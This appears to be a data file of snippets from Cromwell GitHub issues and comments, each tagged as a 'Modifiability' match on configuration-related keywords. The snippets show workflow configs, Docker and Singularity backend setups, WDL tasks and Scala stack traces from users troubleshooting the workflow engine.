Modifiability,"y = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitia",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4044,config,config,4044,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['config']
Modifiability,"y be implemented for ScalaTest, any tests using ScalaCheck directly should be refactored to use ScalaTest's ""ScalaCheck-style"" property based testing. That way any failing property based tests will be tracked as well using our reporting. Because this feature is likely to be used across all cromwell artifacts/subprojects we should decide if we either want to either:; 1. Update every project in `build.sbt` with a `.dependsOn(common, ""test->test"")`; 2. Add scalatest and sentry as `Provided` dependencies to `common` such that they won't be transitively included by default; 3. Create a new `cromwell.test` artifact and use either of the above outside of `cromwell.common`. **A/C:**; - Switch tests directly using scalacheck over to scalatest's scalacheck-style specs; - Create a custom scalatest helper/reporter that retries a failed test a configurable number of times; - Add custom reporter to scalatest settings in `Testing.scala`; - Assuming using sentry for error reporting from Travis:; - Add sentry DSN configuration values to Vault; - Update `build_application.inc.conf` to use a noop sentry DSN by default; - Create a `sentry_application.inc.conf.ctmpl` file that uses sentry configuration values from Vault; - `build_application.inc.conf` attempts to import a `sentry_application.inc.conf` file that overrides the sentry configuration; - NOTE: When `build_application.inc.conf` is missing it will be skipped by the HOCON library. **Links:**; - https://github.com/broadinstitute/cromwell/issues/3657; - http://www.scalatest.org/user_guide/using_the_runner#specifyingReporters; - http://www.scalatest.org/user_guide/writing_scalacheck_style_properties; - http://doc.scalatest.org/3.0.1-2.12/org/scalatest/concurrent/Eventually.html; - http://doc.scalatest.org/3.0.1-2.12/org/scalatest/Retries.html; - http://doc.scalatest.org/3.0.1-2.12/org/scalatest/Reporter.html; - http://doc.scalatest.org/3.0.1-2.12/org/scalatest/events/TestFailed.html; - http://doc.scalatest.org/3.0.1-2.12/org/scalat",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3658:3173,config,configuration,3173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3658,1,['config'],['configuration']
Modifiability,"yaml/src/master/CHANGELOG.rst) - [Changelog](https://bitbucket.org/asomov/snakeyaml/src/master/Changelog.md) - [Changelog](https://bitbucket.org/asomov/snakeyaml/src/master/Changelog.markdown) - [Changelog](https://bitbucket.org/asomov/snakeyaml/src/master/Changelog.rst) - [Changelog](https://bitbucket.org/asomov/snakeyaml/src/master/changelog.md) - [Changelog](https://bitbucket.org/asomov/snakeyaml/src/master/changelog.markdown) - [Changelog](https://bitbucket.org/asomov/snakeyaml/src/master/changelog.rst) - [Changelog](https://bitbucket.org/asomov/snakeyaml/src/master/CHANGES.md) - [Changelog](https://bitbucket.org/asomov/snakeyaml/src/master/CHANGES.markdown) - [Changelog](https://bitbucket.org/asomov/snakeyaml/src/master/CHANGES.rst). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/92f43ce5f010fa03daeb2625a3f9c1b1be80cca5/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (1.28).; You might want to review and update them manually.; ```; centaur/src/main/resources/standardTestCases/local_bourne/local_bourne.wdl; core/src/test/resources/hello_goodbye_scattered_papiv2.json; docs/developers/bitesize/workflowParsing/forkjoin_graph.svg; docs/developers/bitesize/workflowParsing/wdlToWdlom_hermes.svg; project/Dependencies.scala; scripts/metadata_comparison/test/resources/comparer/papiv2_version3_good.json; scripts/metadata_comparison/test/resources/comparer/version3_comparison_good.csv; src/ci/bin/test.inc.sh; src/ci/docker-compose/cromwell-test/docker-setup.sh; supportedBackends/google/pipelines/v2alpha1/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6429:2287,Config,Configure,2287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6429,1,['Config'],['Configure']
Modifiability,yeah I hesitated to argue because I know these are very stable and basically will never be used differently. I just kinda like the configuration all in one place personally. The one place also makes the scanning effort easier.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2499#issuecomment-318475624:131,config,configuration,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2499#issuecomment-318475624,1,['config'],['configuration']
Modifiability,yncJobExecutionActor.isAlive(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recoverAsync(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:574); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:569); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:2220,config,config,2220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['config'],['config']
Modifiability,"ype(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(may",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1387,variab,variable,1387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354,2,['variab'],['variable']
Modifiability,ypoint /bin/bash \; cromwell_1 | -v ${cwd}:${docker_cwd} \; cromwell_1 | ${docker} ${script}; cromwell_1 | ; cromwell_1 | }; cromwell_1 | }; cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:50); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:40); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:39); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:49); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:48); cromwell_1 | 	at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:78); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:121); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:154); cromwell_1 | 	at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:42); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$2.apply(BackendWorkflowInitializationActor.scala:146); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$2.apply(BackendWorkflowInitializationActor.scala:146); cromwell_1 | 	at cromwell.backend.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2284:3499,config,config,3499,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2284,1,['config'],['config']
Modifiability,"zationActor.scala:48); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$badRuntimeAttrsForTask$1$2.apply(BackendWorkflowInitializationActor.scala:141); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$badRuntimeAttrsForTask$1$2.apply(BackendWorkflowInitializationActor.scala:139); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245); at scala.collection.immutable.Map$Map3.foreach(Map.scala:161); ....snip....; ```. default_runtime:. ```; {; ""default_runtime_attributes"": {; ""docker"": ""broadinstitute/gatk-protected:24e6bdc0c058eaa9abe63e1987418d0c144fef8e"",; ""zones"": ""us-central1-a us-central1-b"",; ""disks"": ""local-disk 200 SSD"",; ""memory"": ""6G""; }; }; ```. Relevant snippet from local_application.conf:. ```; ....; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; run-in-background = true; runtime-attributes = ""String? docker""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". // Root directory where Cromwell writes job results. This directory must be; // visible and writeable by the Cromwell process as well as the jobs that Cromwell; // launches.; root: ""cromwell-executions"". filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }. local {; // Cromwell makes a link to your input files within <root>/<workflow UUID>/workflow-inputs; // The following are strategies used to make those links. They are ordered. If one fails; // The next one is tried:; //; // hard-link: attempt to create a hard-link to the file; // copy: copy the file; // soft-link: create a symbolic link to the file; //; // NOTE: soft-link will be skipped for Docker jobs; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; }; }; }; }; ......; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1465:3042,Config,ConfigBackendLifecycleActorFactory,3042,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1465,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"} ${singularity_image} /bin/bash ${script}"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]; } ## end local; } ## end file systems; } ## end config; } ## End Local`. Oddly, when running the workflow I get a submit docker error. ie. as per below. I have no idea why it's looking for docker as I'm not knowingly using it. I'm not using docker in my run time parameters. I have been able to get standalone working on another workflow by passing a singularity container to each task command output but I was wondering if there was a more elegant solution I could use such as just changing to a pre-made provider. I have searched Google and through here but not found anything. I did find one issue here but they seemed to want to use docker where as I don't. . Thanks for the help!. `task submit {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {; singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}; }; }. task submit_docker {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait cat ${docker_cid}). # remove the container after waiting; docker rm cat ${docker_cid}. # return exit code; exit $rc. }; }`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862:2252,config,configuration,2252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862,1,['config'],['configuration']
Modifiability,"} \; 		${""-L "" + panel} \; 		-O ${outputdir}/${sample_id}_raw.vcf.gz; }; output {; 	String unfiltered_vcf = ""${outputdir}/${sample_id}_raw.vcf.gz""; }; }; task GetPileupSummaries{. 	String gatk; String bam_file; 	String ref_fasta; 	String variants_for_contamination ; 	String sample_id ; 	String outputdir ; 	String variants_for_intervals. 	command {; 	 set -e . 	 ${gatk} GetPileupSummaries -R ${ref_fasta} \; 	 -I ${bam_file} -V ${variants_for_contamination} \; 	 -L ${variants_for_intervals} \; 	 -O ${outputdir}/${sample_id}.pileups.table. 	}; 	output {; 		String pileups_table = ""${outputdir}/${sample_id}.pileups.table""; 	}; }; task CalculateContamination {. 		String tumor_pileups; 		String? normal_pileups; 		String gatk; 		String outputdir; 		String sample_id. 	command {; 		set -e ; 		${gatk} CalculateContamination -I ${tumor_pileups} \; 		-O ${outputdir}/${sample_id}.contamination.table \; 		--tumor-segmentation ${outputdir}/${sample_id}.segments.table \; 		${""-matched "" + normal_pileups}; 	}; 	output {; 		String contamination_table = ""${outputdir}/${sample_id}.contamination.table""; 		String maf_segments = ""${outputdir}/${sample_id}.segments.table""; 	}; }; task Filter {. 		String ref_fasta; 		String unfiltered_vcf; 		String sample_id; 		String outputdir; 		String gatk ; 		String variants_for_intervals; 		String contamination_table; 		String maf_segments. 	command {; 		set -e ; 		${gatk} FilterMutectCalls -V ${unfiltered_vcf} \; 		-R ${ref_fasta} -O ${outputdir}/${sample_id}.clean.vcf.gz \; 		--contamination-table ${contamination_table} \; 		-L ${variants_for_intervals} \; 		--tumor-segmentation ${maf_segments} \; 		--filtering-stats ${outputdir}/${sample_id}.filtering.stats; 	}; 	output {; 		String filtered_vcf = ""${outputdir}/${sample_id}.clean.vcf.gz""; 		String filtering_stats = ""${outputdir}/${sample_id}.filtering.stats""; 	}; }; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: --; >; The LocalExample.conf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5859:5007,config,configuration,5007,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5859,1,['config'],['configuration']
Modifiability,} \; cromwell_1 | ${docker} ${script}; cromwell_1 | ; cromwell_1 | }; cromwell_1 | }; cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:50); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:40); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:39); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:49); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:48); cromwell_1 | 	at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:78); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:121); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:154); cromwell_1 | 	at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:42); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$2.apply(BackendWorkflowInitializationActor.scala:146); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$2.apply(BackendWorkflowInitializationActor.scala:146); cromwell_1 | 	at cromwell.backend.BackendLifecycleActor$class.performActionThenRespond(Ba,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2284:3557,Config,ConfigInitializationActor,3557,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2284,1,['Config'],['ConfigInitializationActor']
Modifiability,"}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; ; }; }; }; ```. When I ran `java -Dconfig.file=$(realpath spartan.conf) -jar cromwell-36.jar`, the error it printed was:. ```; Exception in thread ""main"" java.lang.ExceptionInInitializerError; 	at cromwell.CromwellApp$.runCromwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); Caused by: com.typesafe.config.ConfigException$Parse: /data/cephfs/punim0751/spartan.conf: 27: expecting a close parentheses ')' here, not: end of file; 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:1585,config,config,1585,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['config'],['config']
Modifiability,"}; output {; String message = read_string(stdout()); }; runtime {; docker: ""ubuntu:latest""; }; }. workflow wf_hello {; call hello. output {; hello.message; }; }; ```. Contents of hello.inputs:; ```; {; ""wf_hello.hello.addressee"": ""World""; }; ```; Contents of cromwell.BROADexamples.v4.conf:; ```; # This is a ""default"" Cromwell example that is intended for you you to start with; # and edit for your needs. Specifically, you will be interested to customize; # the configuration based on your preferred backend (see the backends section; # below in the file). For backend-specific examples for you to copy paste here,; # please see the cromwell.backend.examples folder in the repository. The files; # there also include links to online documentation (if it exists). # This line is required. It pulls in default overrides from the embedded cromwell; # `reference.conf` (in core/src/main/resources) needed for proper performance of cromwell.; include required(classpath(""application"")). # Google configuration; google {. application-name = ""cromwell-demo"". auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""***@***.gserviceaccount.com""; json-file = ""/***/***.json""; }; ]; }. # Here is where you can define the backend providers that Cromwell understands.; # The default is a local provider.; # To add additional backend providers, you should copy paste additional backends; # of interest that you can find in the cromwell.example.backends folder; # folder at https://www.github.com/broadinstitute/cromwell; # Other backend providers include SGE, SLURM, Docker, udocker, Singularity. etc.; # Don't forget you will need to customize them for your particular use case.; backend {; # Override the default backend.; default = ""PAPIv2"". # The list of providers.; providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory""; config {; # Google p",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:9601,config,configuration,9601,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['config'],['configuration']
Modifiability,"}; }; output {; File out = ""${outfilename}""; }; }. workflow test1 {; String name. call hello {; input: outfilename=""${name}.txt"", name = ""${name}""; }; }; ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Using default configuration. Output:; ```; [2020-02-11 10:13:03,33] [info] Running with database db.url = jdbc:hsqldb:mem:89c116e0-5bca-4467-aaff-ae492c2ebbaf;shutdown=false;hsqldb.tx=mvcc; [2019-02-11 10:13:14,71] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-02-11 10:13:14,75] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-02-11 10:13:15,05] [info] Running with database db.url = jdbc:hsqldb:mem:6b5d8035-4932-4680-b912-34885765f705;shutdown=false;hsqldb.tx=mvcc; [2019-02-11 10:13:15,63] [info] Slf4jLogger started; [2019-02-11 10:13:16,02] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-1ddecb5"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-02-11 10:13:16,08] [info] Metadata summary refreshing every 2 seconds.; [2019-02-11 10:13:16,20] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-02-11 10:13:16,23] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-02-11 10:13:16,25] [warn] 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); [2019-02-11 10:13:16,26] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-02-11 10:13:16,33] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-02-11 10:13:17,45] [info] SingleWorkflowRunnerActor: Version 37; [2019-02-11 10:13:17,46] [info] SingleWorkflowRunnerActor: Submitting workflow; [2019-02-11 10:13:17,59] [info] Unspecifi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:1829,config,configuration,1829,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,1,['config'],['configuration']
Modifiability,"~{dollar}{DATA_SOURCES_FOLDER}; tar -zvxf ~{dollar}{potential_gnomad_gz}; cd -; else; echo ""ERROR: Cannot find gnomAD folder: ~{dollar}{potential_gnomad_gz}"" 1>&2; false; fi; done; fi. # Run Funcotator:; gatk --java-options ""-Xmx~{runtime_params.command_mem}m"" Funcotator \; --data-sources-path $DATA_SOURCES_FOLDER \; --ref-version ~{reference_version} \; --output-file-format ~{output_format} \; -R ~{ref_fasta} \; -V ~{input_vcf} \; -O ~{output_file} \; ~{interval_list_arg} ~{default="""" interval_list} \; --annotation-default normal_barcode:~{default=""Unknown"" control_id} \; --annotation-default tumor_barcode:~{default=""Unknown"" case_id} \; --annotation-default Center:~{default=""Unknown"" sequencing_center} \; --annotation-default source:~{default=""Unknown"" sequence_source} \; ~{""--transcript-selection-mode "" + transcript_selection_mode} \; ~{transcript_selection_arg}~{default="""" sep="" --transcript-list "" transcript_selection_list} \; ~{annotation_def_arg}~{default="""" sep="" --annotation-default "" annotation_defaults} \; ~{annotation_over_arg}~{default="""" sep="" --annotation-override "" annotation_overrides} \; ~{excluded_fields_args}~{default="""" sep="" --exclude-field "" funcotator_excluded_fields} \; ~{filter_funcotations_args} \; ~{extra_args_arg}; # Make sure we have a placeholder index for MAF files so this workflow doesn't fail:; if [[ ""~{output_format}"" == ""MAF"" ]] ; then; touch ~{output_maf_index}; fi; >>>. runtime {; docker: runtime_params.gatk_docker; bootDiskSizeGb: runtime_params.boot_disk_size; memory: runtime_params.machine_mem + "" MB""; disks: ""local-disk "" + select_first([disk_space, runtime_params.disk]) + "" HDD""; preemptible: runtime_params.preemptible; maxRetries: runtime_params.max_retries; cpu: runtime_params.cpu; }. output {; File funcotated_output_file = ""~{output_file}""; File funcotated_output_file_index = ""~{output_file_index}""; }; }; ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5345:38766,config,configuration,38766,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5345,1,['config'],['configuration']
